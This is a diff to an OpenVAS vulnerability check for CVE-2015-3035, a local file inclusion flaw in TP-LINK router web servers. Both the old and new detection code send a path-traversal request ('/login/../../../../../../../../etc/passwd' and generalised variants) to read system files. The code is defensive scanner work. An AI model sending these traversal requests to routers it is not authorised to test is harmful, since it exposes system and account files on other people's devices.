@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_tp_link_lfi_cve_2015_3035.nasl 10771 2018-08-04 15:18:29Z cfischer $
+# $Id: gb_tp_link_lfi_cve_2015_3035.nasl 11831 2018-10-11 07:49:24Z jschulte $
 #
 # Multiple TP-LINK Products Local File Include Vulnerability
 #
@@ -31,15 +31,16 @@ if(description)
   script_cve_id("CVE-2015-3035");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_version("$Revision: 10771 $");
+  script_version("$Revision: 11831 $");
   script_name("Multiple TP-LINK Products Local File Include Vulnerabilit");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-04 17:18:29 +0200 (Sat, 04 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
   script_tag(name:"creation_date", value:"2015-04-10 16:25:11 +0200 (Fri, 10 Apr 2015)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
-  script_dependencies("gb_get_http_banner.nasl");
+  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
+  script_require_keys("Host/runs_unixoide");
   script_mandatory_keys("Router_Webserver/banner");
 
   script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150410-0_TP-Link_Unauthenticated_local_file_disclosure_vulnerability_v10.txt");
@@ -98,16 +99,24 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 banner = get_http_banner( port:port );
 if( ! banner || ( "Server: Router Webserver" >!< banner && 'realm="TP-LINK' >!< banner && 'realm="TL-' >!< banner ) ) exit( 0 );
 
-url = '/login/../../../../../../../../etc/passwd';
-if( http_vuln_check( port:port, url:url, pattern:"root:.*:0:[01]:" ) ) {
-  report = report_vuln_url( port:port, url:url );
-  security_message( port:port, data:report );
-  exit(0);
+files = traversal_files("linux");
+
+foreach pattern( keys( files ) ) {
+
+  file = files[pattern];
+
+  url = '/login/../../../../../../../../' + file;
+  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit(0);
+  }
 }
 
 exit(99);
